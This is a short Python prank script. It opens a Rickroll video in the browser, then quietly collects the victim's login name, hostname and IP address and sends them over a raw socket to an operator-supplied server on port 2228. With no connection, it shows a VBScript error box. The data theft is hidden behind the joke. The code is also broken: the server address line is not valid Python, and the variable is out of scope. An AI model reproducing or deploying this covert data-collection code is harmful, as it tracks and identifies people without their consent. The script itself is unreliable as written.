import webbrowser as wb
import socket
import os
import subprocess

def check_internet_connection():
    try:
        # Try to establish a connection to a YouTube server (one of its IP addresses)
        socket.create_connection(("172.217.18.206", 443), timeout=5000)
        return True
    except OSError:
        return False

def settings():
    global target_port, data_to_send
    target_port = 2228  # Replace with the port you want to target
    data_to_send = "Rickroll triggered by: {user_info} on {hostname} with IP address {ip_address}\n"
    ipserver = your server ip

def send_data_to_port(port, data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ipserver, port))
        s.sendall(str(data).encode('utf-8'))

def rickroll():
    if check_internet_connection():
        # Your rickroll code here
        wb.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        # Collecting information
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        user_info = os.getlogin()

        # Log the information
        send_data_to_port(target_port, data_to_send.format(user_info=user_info, hostname=hostname, ip_address=ip_address))
    else:
        # Execute the embedded VBScript to display a message box
        vbscript_code = """
        MsgBox "Can't connect to the internet to install the rickroll.", vbExclamation, "Error"
        """
        subprocess.run(["wscript", "/E:vbscript", "/B", "-"], input=vbscript_code.encode('utf-16le'))

# Call the rickroll function
settings()
rickroll()
